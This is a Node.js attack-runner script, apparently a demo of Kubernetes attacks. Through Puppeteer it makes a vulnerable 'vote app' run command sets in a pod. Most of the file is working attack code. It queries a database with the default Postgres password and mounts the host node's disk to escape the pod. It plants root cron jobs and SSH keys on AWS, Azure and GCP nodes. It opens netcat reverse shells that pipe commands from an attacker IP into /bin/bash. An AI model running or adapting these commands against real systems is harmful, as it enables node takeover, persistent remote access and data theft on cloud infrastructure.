const { program } = require('commander');
program.version('0.0.1');
const puppeteer = require('puppeteer')
const lib = require('./lib/lib')

global.verbose = false

let attacks = {
  'test_attack': {
    'parameter': { 'option_key': 'dirname', 'replace': 'DIR_NAME'},
    'commands': [ 'touch DIR_NAME' ]
  },
  'postgres_attack': {
    'commands': [
      "apt-get update",
      "apt-get install -y postgresql-client",
      "curl --max-time 15 database",
      "curl --max-time 15 mysql",
      "curl --max-time 15 postgres",
      "curl --max-time 15 storage",
      "curl --max-time 15 db",
      "export PGPASSWORD='postgres'; psql -h db -U postgres -c 'SELECT * FROM votes, pg_sleep(15)'"
    ],
  },
  'escape_pod_via_cron_aws': {
    'parameter': { 'option_key': 'remote', 'replace': 'REMOTE_HOST_IP'},
    'commands': [
      "mkdir -p /mnt/node_volume",
      "mount /dev/xvda1 /mnt/node_volume",
      "rm /mnt/node_volume/run.sh",
      "echo '* * * * * root yum install -y nc' >> /mnt/node_volume/etc/crontab",
      "echo '* * * * * root /usr/bin/nc REMOTE_HOST_IP 5555 | /bin/bash' >> /mnt/node_volume/etc/crontab"
    ],
  },
  'escape_pod_via_ssh_aws': {
    'parameter': { 'option_key': 'remote', 'replace': 'REMOTE_HOST_IP'},
    'commands': [
      "mkdir -p /mnt/node_volume",
      "mount /dev/xvda1 /mnt/node_volume",
      "rm -rf .ssh; mkdir .ssh",
      "apt update; apt install ssh-client -y",
      "ssh-keygen -t rsa -N '' -f .ssh/id_rsa",
      "cat .ssh/id_rsa.pub >> /mnt/node_volume/root/.ssh/authorized_keys",
      "SSH_HOST=$(cat /mnt/node_volume/etc/hostname); ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i .ssh/id_rsa root@$SSH_HOST 'yum update; yum install -y nc'",
      "SSH_HOST=$(cat /mnt/node_volume/etc/hostname); ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i .ssh/id_rsa root@$SSH_HOST 'sudo /usr/bin/nc REMOTE_HOST_IP 5555 | /bin/bash'",
    ],
  },
  'escape_pod_via_ssh_azure': {
    'parameter': { 'option_key': 'remote', 'replace': 'REMOTE_HOST_IP'},
    'commands': [
      "mkdir -p /mnt/node_volume",
      "mount /dev/sda1 /mnt/node_volume",
      "rm -rf .ssh; mkdir .ssh",
      "apt update; apt install ssh-client tar -y",
      "ssh-keygen -t rsa -N '' -f .ssh/id_rsa",
      "cat .ssh/id_rsa.pub >> /mnt/node_volume/home/azureuser/.ssh/authorized_keys",
      "SSH_HOST=$(cat /mnt/node_volume/etc/hostname); ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i .ssh/id_rsa azureuser@$SSH_HOST 'sudo apt-get install -y netcat'",
      "SSH_HOST=$(cat /mnt/node_volume/etc/hostname); ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i .ssh/id_rsa azureuser@$SSH_HOST 'sudo nc REMOTE_HOST_IP 5555 | /bin/bash'",
    ],
  },
  'escape_pod_via_ssh_gcp': {
    'parameter': { 'option_key': 'remote', 'replace': 'REMOTE_HOST_IP'},
    'commands': [
      "mkdir -p /mnt/node_volume",
      "mount /dev/sda1 /mnt/node_volume",
      "rm -rf .ssh; mkdir .ssh",
      "apt update; apt install ssh-client tar -y",
      "ssh-keygen -t rsa -N '' -f .ssh/id_rsa",
      "cat .ssh/id_rsa.pub >> /mnt/node_volume/root/.ssh/authorized_keys",
      "SSH_HOST=$(cat /mnt/node_volume/etc/hostname); ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i .ssh/id_rsa root@$SSH_HOST 'sudo apt-get install -y netcat'",
      "SSH_HOST=$(cat /mnt/node_volume/etc/hostname); ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o GlobalKnownHostsFile=/dev/null -v -i .ssh/id_rsa root@$SSH_HOST 'sudo /usr/bin/nc REMOTE_HOST_IP 5555 | /bin/bash'",
    ],
  },

}

async function run () {
  program
    .option('-u, --url <vote_app_url>', 'url of the vote app')
    .option('-a, --attack <attack_to_run>', 'attacks: ' + Object.keys(attacks).toString())
    .option('-r, --remote <remote_host_ip>', 'attackers remote host ip address')
    .option('-d, --dirname <remote_host_ip>', 'attackers remote host ip address')
    .option('-v, --verbose', 'verbose output and screenshots')
  program.parse(process.argv);
  const options = program.opts();

  if(options['verbose']){
    console.log('Verbose mode enabled')
    global.verbose = true
  }

  let url = lib.get_url(options);
  let attack_type = lib.get_attack_type(options, attacks)

  let attack = attacks[attack_type]
  attack = lib.replace_command_with_parameters(attack, options)

  console.log('Running attack: '+ attack_type)
  console.log('Vote App: '+ url)

  const browser = await puppeteer.launch({args: ['--no-sandbox']});
  const page = await browser.newPage();
  await page.setViewport({ width: 1366, height: 850});

  try {
    await page.goto(url);
  } catch (err) {
    console.log("Can't open URL provided: " + url)
    browser.close();
    return
  }

  try {
    await lib.find_or_create_attack_pod(page)
    await lib.run_commands(page, attack['commands'])
  } catch (err) {
    console.log(err)
  }finally{
    browser.close();
  }
}

run();